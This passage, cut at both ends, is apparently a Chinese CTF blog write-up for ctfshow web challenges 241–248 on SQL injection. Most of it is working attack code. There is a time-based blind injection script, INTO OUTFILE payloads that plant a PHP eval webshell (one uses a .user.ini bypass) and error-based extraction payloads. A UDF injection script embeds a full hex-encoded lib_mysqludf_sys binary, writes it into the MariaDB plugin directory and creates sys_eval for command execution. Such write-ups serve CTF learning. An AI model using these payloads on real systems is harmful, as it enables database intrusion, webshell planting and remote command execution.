information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.05),1)#&quot;.format(i,mid) # banlist,ctfshow_user,flag        #&#39;id&#39;:&quot;if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.05),0)&quot;.format(i,mid) #id,flag,info        &#39;id&#39;:&quot;if(ascii(substr((select flag from flag),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.05),0)&quot;.format(i,mid) #ctfshow&#123;24de54e5-a424-4e33-b6ff-00da4a72c909&#125;    &#125;        &#125;        print(data)        try:           r &#x3D; requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;1)           m&#x3D;mid        except:            n&#x3D;mid        if(m+1&#x3D;&#x3D;n):            flag+&#x3D;chr(m)            print(flag)            break</code></pre><h2 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h2><p>sql语句</p><pre class="language-sql" data-language="sql"><code class="language-sql">&#x2F;&#x2F;备份表$sql &#x3D; &quot;select * from ctfshow_user into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;dump&#x2F;&#123;$filename&#125;&#39;;&quot;;</code></pre><pre class="language-txt" data-language="txt"><code class="language-txt">SELECT ... INTO OUTFILE &#39;file_name&#39;        [CHARACTER SET charset_name]        [export_options]export_options:    [&#123;FIELDS | COLUMNS&#125;        [TERMINATED BY &#39;string&#39;]&#x2F;&#x2F;分隔符        [[OPTIONALLY] ENCLOSED BY &#39;char&#39;]        [ESCAPED BY &#39;char&#39;]    ]    [LINES        [STARTING BY &#39;string&#39;]        [TERMINATED BY &#39;string&#39;]    ]----------------------------------------------------“OPTION”参数为可选参数选项，其可能的取值有：FIELDS TERMINATED BY &#39;字符串&#39;：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。FIELDS ENCLOSED BY &#39;字符&#39;：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。FIELDS ESCAPED BY &#39;字符&#39;：设置转义字符，只能为单个字符。默认值为“\”。LINES STARTING BY &#39;字符串&#39;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。LINES TERMINATED BY &#39;字符串&#39;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</code></pre><p>FIELDS TERMINATED BY、 LINES STARTING BY、 LINES TERMINATED BY写马</p><pre class="language-none"><code class="language-none">在api&#x2F;dump.php传POSTfilename&#x3D;ma.php&#39; LINES STARTING BY &#39;&lt;?php eval($_GET[1]);?&gt;&#39;#然后访问url&#x2F;dump&#x2F;ma.phpurl&#x2F;dump&#x2F;ma.php?1&#x3D;system(&#39;cat &#x2F;flag.here&#39;);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511230830784.png" alt="image-20220511230830784"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511230845780.png" alt="image-20220511230845780"></p><h2 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h2><p>sql语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;备份表$sql &#x3D; &quot;select * from ctfshow_user into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;dump&#x2F;&#123;$filename&#125;&#39;;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;过滤了php</code></pre><p>可以利用.user.ini</p><p>先传</p><pre class="language-txt" data-language="txt"><code class="language-txt">filename&#x3D;.user.ini&#39; lines starting by &#39;;&#39; terminated by 0x0a6175746f5f70726570656e645f66696c653d312e6a70670a;#为保证auto_prepend_file&#x3D;1.jpg在单独一行，所以在开头结尾都加上了0x0a来换行</code></pre><p>再传1.jpg就行了</p><p>因为过滤了php，可以用短标签或者十六进制绕过：</p><pre class="language-txt" data-language="txt"><code class="language-txt">filename&#x3D;1.jpg&#39; LINES STARTING BY &#39;&lt;?&#x3D;eval($_GET[1]);?&gt;&#39;#</code></pre><p>然后访问</p><pre class="language-payload" data-language="payload"><code class="language-payload">&#x2F;dump&#x2F;index.php?1&#x3D;system(&#39;cat &#x2F;flag.here&#39;);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511231353361.png" alt="image-20220511231353361"></p><h2 id="web244、245"><a href="#web244、245" class="headerlink" title="web244、245"></a>web244、245</h2><p>报错注入</p><p>updatexml()和extractvalue()应该都可以</p><pre class="language-sql" data-language="sql"><code class="language-sql">web244&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))--+&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flag&#39;),0x7e))--+&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),1,30),0x7e))+--+&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),20,30),0x7e))+--+web245同理</code></pre><h2 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h2><p>sql语句</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤过滤updatexml extractvalue    </code></pre><p>报错注入</p><p>过滤updatexml extractvalue了之后，还有这些可用</p><pre class="language-sql" data-language="sql"><code class="language-sql">1.floor()、round()、ceil()2.exp() &#x2F;&#x2F;5.5.5版本之后可以使用3.name_const 4.geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错</code></pre><p>payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; Union select 1,count(*),concat((database()),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+</code></pre><p>然后就是正常的查列查字段的操作了</p><p>还可以用这种</p><pre class="language-none"><code class="language-none">1&#39; or 1 group by concat_ws(0x7e,(select flag2 from ctfshow_flags),floor(rand(0)*2)) having min(0) or 1 --+</code></pre><h2 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h2><p>sql语句</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤过滤updatexml extractvalue floor    </code></pre><p>floor也过滤了</p><pre class="language-none"><code class="language-none">round()&#96;和&#96;ceil()&#96;可以代替&#96;floor()</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512175811180.png" alt="image-20220512175811180"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512175845954.png" alt="image-20220512175845954"></p><pre class="language-sql" data-language="sql"><code class="language-sql">&#39; union select 1,count(*),concat((select &#96;flag?&#96; from ctfshow_flagsa ), 0x7e,round(rand(0)*2))b from information_schema.tables group by b --+-1&#39; Union select 1,count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;ctfshow_web&#39; limit 1,1),0x26,ceil(rand(0)*2))x from information_schema.columns group by x;--</code></pre><p>后边正常查就行，要注意的就是别忘了加limit，还有就是字段名flag变成了flag?，表名和字段名都可以用反引号引起来，这是用来区分MYSQL的保留字与普通字符。所以最终的payload为</p><pre class="language-sql" data-language="sql"><code class="language-sql">http:&#x2F;&#x2F;73673ded-1809-4e00-a9cf-eb2535a42fa6.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;-1&#39; Union select 1,count(*),concat((select &#96;flag?&#96; from ctfshow_flagsa),0x26,ceil(rand(0)*2))x from information_schema.columns group by x;--+</code></pre><h2 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h2><p>sql语句</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤,</code></pre><p>题目提示是udf注入</p><p>原理大致就是mysql可以把dll文件写到目标机子的plugin目录，这个目录是可以通过<code>select @@plugin_dir</code>来得到的。</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#x2F;api&#x2F;?id&#x3D;1&#39;; select @@plugin_dir; -- -查出Mysql插件路径：&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;&#x2F;api&#x2F;?id&#x3D;&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;--+引入udf.so文件从而创建函数sys_eval</code></pre><p>大师傅的脚本</p><pre class="language-python" data-language="python"><code class="language-python">import requestsbase_url&#x3D;&quot;http:&#x2F;&#x2F;994eba84-9ea5-4701-b204-01320382100c.challenge.ctf.show&#x2F;api&#x2F;&quot;payload &#x3D; []text &#x3D; [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;]udf &#x3D; &quot;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&quot;for i in range(0,21510, 5000):    end &#x3D; i + 5000    payload.append(udf[i:end])p &#x3D; dict(zip(text, payload))for t in text:    url &#x3D; base_url+&quot;?id&#x3D;&#39;;select unhex(&#39;&#123;&#125;&#39;) into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;&#123;&#125;.txt&#39;--+&amp;page&#x3D;1&amp;limit&#x3D;10&quot;.format(p[t], t)    r &#x3D; requests.get(url)    print(r.status_code)next_url &#x3D; base_url+&quot;?id&#x3D;&#39;;select concat(load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;a.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;b.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;c.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;d.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;e.txt&#39;)) into dumpfile 